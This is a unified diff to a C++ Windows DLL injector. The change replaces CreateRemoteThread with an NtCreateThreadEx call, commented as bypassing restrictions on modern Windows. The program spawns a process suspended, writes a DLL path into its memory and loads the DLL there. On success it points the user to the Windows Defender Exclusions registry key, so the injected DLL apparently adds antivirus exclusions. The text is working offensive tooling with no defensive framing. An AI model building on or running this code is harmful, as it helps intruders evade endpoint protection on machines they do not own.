@@ -2,28 +2,32 @@
 #include <tlhelp32.h>
 #include <iostream>
 
-// DLL Injector - spawns a target process then injects DLL into it
-// Requires: Admin privileges
-// Usage: injector.exe <exe_path> <dll_path>
-// Example: injector.exe C:\Windows\System32\notepad.exe C:\projects\exclusion.dll
+// NtCreateThreadEx based DLL injector
+// Bypasses CreateRemoteThread restrictions on modern Windows
+// Requires: Admin privileges, run from Developer Command Prompt
 
-bool InjectDLL(DWORD pid, const wchar_t* dllPath) {
+typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
+    PHANDLE hThread,
+    ACCESS_MASK DesiredAccess,
+    LPVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID lpParameter,
+    BOOL CreateSuspended,
+    DWORD StackZeroBits,
+    DWORD SizeOfStackCommit,
+    DWORD SizeOfStackReserve,
+    LPVOID lpBytesBuffer
+);
+
+bool InjectDLL(HANDLE hProcess, DWORD pid, const wchar_t* dllPath) {
     size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
 
-    HANDLE hProcess = OpenProcess(
-        PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
-        FALSE, pid
-    );
-    if (!hProcess) {
-        std::wcerr << L"[!] OpenProcess failed. Error: " << GetLastError() << std::endl;
-        return false;
-    }
     std::wcout << L"[+] Opened process PID: " << pid << std::endl;
 
     LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remoteBuffer) {
         std::wcerr << L"[!] VirtualAllocEx failed. Error: " << GetLastError() << std::endl;
-        CloseHandle(hProcess);
         return false;
     }
     std::wcout << L"[+] Allocated memory in target process" << std::endl;
@@ -31,33 +35,47 @@ bool InjectDLL(DWORD pid, const wchar_t* dllPath) {
     if (!WriteProcessMemory(hProcess, remoteBuffer, dllPath, pathSize, NULL)) {
         std::wcerr << L"[!] WriteProcessMemory failed. Error: " << GetLastError() << std::endl;
         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
         return false;
     }
     std::wcout << L"[+] Wrote DLL path to target process memory" << std::endl;
 
     LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
     if (!loadLibAddr) {
-        std::wcerr << L"[!] GetProcAddress failed. Error: " << GetLastError() << std::endl;
+        std::wcerr << L"[!] GetProcAddress failed." << std::endl;
         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
         return false;
     }
-    std::wcout << L"[+] Found LoadLibraryW at: " << loadLibAddr << std::endl;
+    std::wcout << L"[+] LoadLibraryW at: " << loadLibAddr << std::endl;
 
-    HANDLE hThread = CreateRemoteThread(
-        hProcess, NULL, 0,
-        (LPTHREAD_START_ROUTINE)loadLibAddr,
-        remoteBuffer, 0, NULL
+    // Load NtCreateThreadEx from ntdll
+    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(
+        GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx"
     );
-    if (!hThread) {
-        std::wcerr << L"[!] CreateRemoteThread failed. Error: " << GetLastError() << std::endl;
+    if (!NtCreateThreadEx) {
+        std::wcerr << L"[!] Failed to get NtCreateThreadEx" << std::endl;
         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+        return false;
+    }
+    std::wcout << L"[+] Got NtCreateThreadEx" << std::endl;
+
+    HANDLE hThread = NULL;
+    NTSTATUS status = NtCreateThreadEx(
+        &hThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        hProcess,
+        (LPTHREAD_START_ROUTINE)loadLibAddr,
+        remoteBuffer,
+        FALSE, 0, 0, 0, NULL
+    );
+
+    if (status != 0 || !hThread) {
+        std::wcerr << L"[!] NtCreateThreadEx failed. NTSTATUS: 0x" << std::hex << status << std::endl;
+        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
         return false;
     }
 
-    std::wcout << L"[+] Remote thread created, waiting for DLL to load..." << std::endl;
+    std::wcout << L"[+] Thread created via NtCreateThreadEx, waiting..." << std::endl;
     WaitForSingleObject(hThread, 5000);
 
     DWORD exitCode = 0;
@@ -66,10 +84,9 @@ bool InjectDLL(DWORD pid, const wchar_t* dllPath) {
 
     CloseHandle(hThread);
     VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
 
     if (exitCode == 0) {
-        std::wcerr << L"[!] DLL load failed in target process" << std::endl;
+        std::wcerr << L"[!] DLL load returned NULL - check DLL path exists" << std::endl;
         return false;
     }
 
@@ -87,10 +104,9 @@ int wmain(int argc, wchar_t* argv[]) {
     const wchar_t* targetExe = argv[1];
     const wchar_t* dllPath   = argv[2];
 
-    std::wcout << L"[*] Spawning process: " << targetExe << std::endl;
-    std::wcout << L"[*] DLL path: " << dllPath << std::endl;
+    std::wcout << L"[*] Spawning: " << targetExe << std::endl;
+    std::wcout << L"[*] DLL: " << dllPath << std::endl;
 
-    // Spawn the target process suspended
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = {};
 
@@ -99,27 +115,21 @@ int wmain(int argc, wchar_t* argv[]) {
         std::wcerr << L"[!] CreateProcess failed. Error: " << GetLastError() << std::endl;
         return 1;
     }
-
     std::wcout << L"[+] Spawned suspended PID: " << pi.dwProcessId << std::endl;
 
-    // Inject while suspended — guaranteed same privilege level
-    bool ok = InjectDLL(pi.dwProcessId, dllPath);
+    bool ok = InjectDLL(pi.hProcess, pi.dwProcessId, dllPath);
 
-    // Resume the process
     ResumeThread(pi.hThread);
     std::wcout << L"[+] Process resumed" << std::endl;
 
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
 
-    if (!ok) {
-        std::wcerr << L"[!] Injection failed" << std::endl;
-        return 1;
+    if (ok) {
+        std::wcout << L"[+] Done - check regedit: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" << std::endl;
     }
 
-    std::wcout << L"[+] Done - check regedit: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" << std::endl;
-    return 0;
+    return ok ? 0 : 1;
 }
 
-// Compile:
-//   cl injector.cpp /Fe:injector.exe /EHsc /nologo
+// Compile: cl injector.cpp /Fe:injector.exe /EHsc /nologo
